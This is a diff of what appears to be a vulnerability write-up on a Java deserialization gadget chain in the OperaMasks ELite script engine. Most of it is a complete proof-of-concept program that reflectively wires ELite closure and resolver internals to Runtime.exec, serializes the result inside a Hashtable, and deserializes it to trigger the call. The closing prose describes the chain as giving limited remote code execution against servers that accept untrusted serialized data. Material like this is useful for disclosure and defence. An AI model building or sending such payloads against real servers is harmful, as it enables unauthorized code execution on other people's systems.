@@ -359,7 +359,121 @@ public class basicThisObjectTest {
 }
 
 This code shows the path from equals to any method. The path from readObject to equals can still refer to the previous HashTable class.
+The complete verification code is given below：
 
-After the script is executed, the calculator will pop up twice. The first execution is when the object is put into the hashtable for the second time. The second execution is when deserializing.
-This deserialization chain only uses classes in the Hashtable and ELite dependencies, indicating that any server that uses this dependency may be vulnerable to deserialization attacks.
-We imagine that a certain interface of a Java server can deserialize foreign data. This server has an ELite script engine dependency, so we can send the serialized data in the above script to it, thereby remotely RCE.
+import org.apache.xalan.xsltc.trax.TemplatesImpl;
+import org.operamasks.el.eval.ELContextImpl;
+import org.operamasks.el.eval.EvaluationContext;
+import org.operamasks.el.eval.closure.ClassDefinition;
+import org.operamasks.el.eval.closure.LiteralClosure;
+import org.operamasks.el.eval.closure.MethodClosure;
+import org.operamasks.el.eval.closure.ThisObject;
+import org.operamasks.el.parser.ELNode;
+import org.operamasks.el.resolver.MethodResolver;
+import org.operamasks.el.eval.ELEngine;
+import org.operamasks.util.SimpleCache;
+
+import javax.el.BeanELResolver;
+import javax.el.CompositeELResolver;
+import javax.el.ELContext;
+import javax.el.ELResolver;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.*;
+import java.util.concurrent.ConcurrentSkipListSet;
+
+public class basicThisObjectTest {
+    public static void main(String[] args) throws Exception {
+        Method exec = Runtime.class.getMethod("exec", String.class);
+        // Method exec = TemplatesImpl.class.getMethod("getOutputProperties");
+        Runtime base = Runtime.getRuntime();
+        // TemplatesImpl base = new TemplatesImpl();
+        LiteralClosure literalClosure = new LiteralClosure(base);
+
+        HashMap<Object, Object> hashMap = new HashMap<>();
+        hashMap.put("equals", literalClosure);
+
+        // CompositeELResolver resolver = new CompositeELResolver();
+        // resolver.add(new BeanELResolver());
+        // ELContext ctx = new ELContextImpl(resolver);
+        // ctx.putContext(MethodResolver.class, new MethodResolver());
+        Class<?> methodClosure = Class.forName("org.operamasks.el.resolver.SingleMethodClosure");
+        Constructor<?> methodClosureConstructor = methodClosure.getDeclaredConstructor(Method.class);
+        methodClosureConstructor.setAccessible(true);
+        MethodClosure singleMethodClosure = (MethodClosure)methodClosureConstructor.newInstance(exec);
+        Class<Method> baseClass = Method.class;
+
+        Class<?> methodMapCls = Class.forName("org.operamasks.el.resolver.MethodResolver$MethodMap");
+        Constructor<?> mmCtor = methodMapCls.getDeclaredConstructor();
+        mmCtor.setAccessible(true);
+        Object methodMap = mmCtor.newInstance();
+        Field mapField = methodMapCls.getDeclaredField("map");
+        mapField.setAccessible(true);
+        @SuppressWarnings("unchecked")
+        Map<String, MethodClosure> internalMap =
+                (Map<String, MethodClosure>) mapField.get(methodMap);
+        internalMap.clear();
+        internalMap.put("__call__", singleMethodClosure);
+        // internalMap.put("__call__", singleMethodClosure2);
+        @SuppressWarnings("unchecked")
+        SimpleCache<Class<?>, Object> newCache = new SimpleCache<>(200);
+        newCache.put(base.getClass(), methodMap);
+        MethodResolver resolver = new MethodResolver();
+        Field cacheField = MethodResolver.class.getDeclaredField("cache");
+        cacheField.setAccessible(true);
+        cacheField.set(resolver, newCache);
+
+        ELContext elContext = ELEngine.createELContext();
+        elContext.putContext(MethodResolver.class, resolver);
+        Method setCurrentELContext = ELEngine.class.getDeclaredMethod("setCurrentELContext", new Class[]{ELContext.class});
+        setCurrentELContext.setAccessible(true);
+        setCurrentELContext.invoke(null, new Object[]{elContext});
+
+        Class<?> ec = Class.forName("org.operamasks.el.eval.EvaluationContext");
+        EvaluationContext ecInstance = (EvaluationContext)ec.getDeclaredConstructor(ELContext.class).newInstance(elContext);
+        ClassDefinition classDefinition = new ClassDefinition(ecInstance, new ELNode.CLASSDEF(1, "", "", "", new String[]{""}, new ELNode.DEFINE[]{}, new ELNode.DEFINE[]{}));
+
+        Class<?> basicClass = Class.forName("org.operamasks.el.eval.closure.BasicThisObject");
+        Constructor<?> basicClassConstructor = basicClass.getDeclaredConstructor(ELContext.class, ClassDefinition.class, Map.class);
+        basicClassConstructor.setAccessible(true);
+        ThisObject basicThisObject = (ThisObject)basicClassConstructor.newInstance(elContext, classDefinition, hashMap);
+
+        HashMap<Object, Object> hashMap2 = new HashMap<>();
+        hashMap2.put("calc", "calc");
+        ThisObject basicThisObject2 = (ThisObject)basicClassConstructor.newInstance(elContext, classDefinition, hashMap);
+
+        LiteralClosure literalClosure1 = new LiteralClosure("calc");
+        basicThisObject.equals(basicThisObject2);
+
+        Hashtable<Object, Object> hashtable = new Hashtable<>();
+        hashtable.put(basicThisObject, "test");
+        hashtable.put(basicThisObject2, "test");
+
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(hashtable);
+        oos.flush();
+        oos.close();
+
+        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
+        System.out.println(base64String);
+
+        byte[] decode = Base64.getDecoder().decode(base64String);
+        ByteArrayInputStream bais = new ByteArrayInputStream(decode);
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+
+    }
+}
+
+After executing this program, the Runtime class's exec method can be called, but the parameters cannot be directly controlled. This method can be used to call any method of any class on the server, but the parameters still cannot be controlled.
+
+Assuming the remote server includes this OperaMasks SDK ELite dependency and exposes a deserialization interface, an attacker can exploit this vulnerability to gain limited remote code execution.
+
+Assuming the command execution logic in a method on the server does not rely on its parameters but only on the class's properties, this can lead to remote server privileges.
